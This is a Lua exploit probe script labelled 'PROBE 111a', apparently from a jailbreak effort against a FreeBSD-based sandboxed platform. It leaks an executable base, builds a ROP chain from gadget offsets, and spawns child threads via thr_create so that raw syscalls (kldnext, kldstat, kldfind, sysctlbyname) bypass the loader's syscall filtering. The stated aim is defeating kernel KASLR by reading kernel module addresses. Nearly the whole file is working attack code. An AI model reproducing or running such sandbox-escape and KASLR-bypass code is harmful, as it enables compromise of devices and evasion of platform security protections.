-- CRASH_CLASS: HIGH
-- PROBE 111a: kldstat/kldnext from child thread — KASLR defeat attempt
--
-- fstat(189) kills from make_syscall but WORKS from child thread (110a).
-- The difference: make_syscall goes through the Lua loader's wrapper,
-- child thread calls SA (syscall entry) directly via thr_create.
--
-- If kldstat(308) also works from child: it returns kernel module load
-- addresses → instant KASLR defeat.
--
-- kldnext(307): int kldnext(int fileid) → next module ID
-- kldstat(308): int kldstat(int fileid, struct kld_file_stat *stat)
-- kldfind(306): int kldfind(const char *file)
-- kldsym(337): int kldsym(int fileid, int cmd, struct kld_sym_lookup *data)
--
-- Strategy: test kldnext first (simple, returns int), then kldstat
-- if process survives.

print("=== PROBE 111a: KLDSTAT FROM CHILD THREAD ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end
local PRAX=ga(0x992); local PRDI=ga(0xC9DFE)
local PRSI=ga(0xD77D); local WMOV=ga(0x92C67)

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(16*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl300=R+0x40; wq(sl300,uint64(0)); wq(sl300+8,uint64(300000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
local KLD_BUF=R+0x4000*6  -- kld_file_stat buffer (needs ~2KB)

local function child_syscall(label, sysno, a1, a2, a3, a4, a5)
    z(child_ctx, 0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(sysno))
    wq(child_ctx+_DI,uint64(a1 or 0))
    wq(child_ctx+_SI,uint64(a2 or 0))
    wq(child_ctx+_DX,uint64(a3 or 0))
    wq(child_ctx+_R10,uint64(a4 or 0))
    wq(child_ctx+_R8,uint64(a5 or 0))

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl300),0)

    local c = N(native.fcall_with_rax(stub,20))
    if c~=pid then
        print(string.format("  %s: PROCESS KILLED", label))
        return nil, false
    end

    local rv_lo = rd(RESULT) or 0
    local rv_hi = rd(RESULT+4) or 0
    if rv_lo==0xDEADCAFE and rv_hi==0 then
        print(string.format("  %s: SENTINEL (child died)", label))
        return -999, true
    end

    local signed = rv_lo
    if rv_hi==0xFFFFFFFF then signed = -1 end

    print(string.format("  %s: rv=%d (0x%X%08X)", label, signed, rv_hi, rv_lo))
    return signed, true
end

-- ============================================================
print("")
print("--- CONTROL: fstat(189) from child (known to work) ---")
local fstat_buf = memory.alloc(0x100)
z(fstat_buf, 0x100)
local rv, alive = child_syscall("fstat(fd=3)", 189, 3, N(fstat_buf))
if not alive then print("PROCESS DIED ON CONTROL!") return end
print(string.format("  fstat control: rv=%s (expected 0)", tostring(rv)))

-- ============================================================
print("")
print("--- A: kldnext(307) from child — get first module ID ---")
-- kldnext(0) returns the first loaded module's file ID
local kn_rv, kn_alive = child_syscall("kldnext(0)", 307, 0)
if not kn_alive then
    print("*** kldnext KILLED PROCESS — blocked at kernel level ***")
    return
end
print(string.format("  kldnext(0) = %s", tostring(kn_rv)))

if kn_rv and kn_rv > 0 then
    print("  *** KLDNEXT WORKS FROM CHILD! ***")

    -- Enumerate all modules
    local module_ids = {kn_rv}
    local fid = kn_rv
    for i=1,20 do
        local nxt, nalive = child_syscall("kldnext("..fid..")", 307, fid)
        if not nalive then print("  killed during enumeration") break end
        if nxt==nil or nxt<=0 then break end
        module_ids[#module_ids+1] = nxt
        fid = nxt
    end
    print(string.format("  found %d module IDs: %s", #module_ids,
        table.concat(module_ids, ", ")))

    -- ============================================================
    print("")
    print("--- B: kldstat(308) from child — get module addresses ---")
    -- kld_file_stat: version at +0x00 (set to sizeof=2076 or similar)
    --   name at +0x04 (1024 bytes)
    --   refs at +0x404 (4)
    --   id at +0x408 (4)
    --   padding to +0x410
    --   address at +0x410 (8) ← KERNEL BASE ADDRESS!
    --   size at +0x418 (8)
    --   pathname at +0x420 (1024)

    for _, mid in ipairs(module_ids) do
        z(KLD_BUF, 0x900)
        -- Set version field (sizeof struct = varies by FreeBSD version)
        -- Try sizeof = 0x820 (2080) which is common for FreeBSD 11 amd64
        wd(KLD_BUF, 0x820)

        local ks_rv, ks_alive = child_syscall(
            string.format("kldstat(id=%d)", mid),
            308, mid, KLD_BUF)
        if not ks_alive then
            print("  *** kldstat KILLED PROCESS ***")
            return
        end

        if ks_rv==0 then
            print(string.format("  *** KLDSTAT SUCCEEDED for module %d! ***", mid))

            -- Read module name (at +0x04, null-terminated string)
            local name_bytes = {}
            for i=0,63 do
                local b = rd(KLD_BUF + 4 + i)
                if b==nil then break end
                local c = b % 256
                if c==0 then break end
                name_bytes[#name_bytes+1] = string.char(c)
            end
            local mod_name = table.concat(name_bytes)

            -- Read address field (at +0x410)
            local addr = rq(KLD_BUF + 0x410)
            local addr_str = fmt_ptr(addr)
            local kp = is_kptr(addr) and " *** KERNEL POINTER! ***" or ""

            -- Read size field (at +0x418)
            local mod_size = rq(KLD_BUF + 0x418)

            print(string.format("    name='%s' address=%s size=%s%s",
                mod_name, addr_str, fmt_ptr(mod_size), kp))

            if is_kptr(addr) then
                print("    *** KASLR DEFEATED! KERNEL MODULE ADDRESS FOUND! ***")
            end

            -- Also try reading address at other offsets in case layout differs
            for check_off=0x400,0x440,8 do
                local v = rq(KLD_BUF + check_off)
                if v and is_kptr(v) then
                    print(string.format("    +0x%X: %s *** KERNEL POINTER ***",
                        check_off, fmt_ptr(v)))
                end
            end
        elseif ks_rv==-1 then
            print(string.format("  kldstat(id=%d): returned -1", mid))
            -- Try different version values
            for _, ver in ipairs({0x438, 0x834, 0x81C}) do
                wd(KLD_BUF, ver)
                local rv2, alive2 = child_syscall(
                    string.format("kldstat(id=%d,ver=0x%X)", mid, ver),
                    308, mid, KLD_BUF)
                if not alive2 then return end
                if rv2==0 then
                    print(string.format("  *** VERSION 0x%X WORKS! ***", ver))
                    local addr = rq(KLD_BUF + 0x410)
                    print(string.format("    +0x410: %s", fmt_ptr(addr)))
                    break
                end
            end
        elseif ks_rv==-999 then
            print(string.format("  kldstat(id=%d): child died (sentinel)", mid))
        end

        local c = N(native.fcall_with_rax(stub,20))
        if c~=pid then print("  process died!") return end
    end
elseif kn_rv==-1 then
    print("  kldnext returned -1 (access denied but NOT killed)")
    print("  trying kldnext with other starting IDs...")
    for fid=1,5 do
        local rv2, alive2 = child_syscall("kldnext("..fid..")", 307, fid)
        if not alive2 then return end
    end
end

-- ============================================================
print("")
print("--- C: kldfind(306) from child — find kernel by name ---")
local kname = memory.alloc(32)
-- Write "kernel" string
wd(kname, 0x6E72656B)     -- "kern"
wd(kname+4, 0x00006C65)   -- "el\0"

local kf_rv, kf_alive = child_syscall("kldfind('kernel')", 306, N(kname))
if not kf_alive then
    print("  kldfind KILLED PROCESS")
    return
end
print(string.format("  kldfind('kernel') = %s", tostring(kf_rv)))

-- ============================================================
print("")
print("--- D: sysctlbyname(570) from child ---")
-- sysctlbyname(name, oldp, oldlenp, newp, newlen)
local sbn_name = memory.alloc(32)
-- "kern.ostype"
wd(sbn_name, 0x6E72656B)     -- "kern"
wd(sbn_name+4, 0x74736F2E)   -- ".ost"
wd(sbn_name+8, 0x00657079)   -- "ype\0"

local sbn_out = memory.alloc(0x100)
z(sbn_out, 0x100)
local sbn_len = memory.alloc(8)
wq(sbn_len, uint64(0x100))

local sbn_rv, sbn_alive = child_syscall("sysctlbyname('kern.ostype')", 570,
    N(sbn_name), N(sbn_out), N(sbn_len), 0, 0)
if not sbn_alive then
    print("  sysctlbyname KILLED PROCESS")
    return
end

if sbn_rv==0 then
    print("  *** SYSCTLBYNAME WORKS! ***")
    -- Read output
    local out_bytes = {}
    for i=0,31 do
        local b = rd(N(sbn_out)+i)
        if b==nil then break end
        local c = b % 256
        if c==0 then break end
        out_bytes[#out_bytes+1] = string.char(c)
    end
    print(string.format("  kern.ostype = '%s'", table.concat(out_bytes)))
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 111a COMPLETE ===")
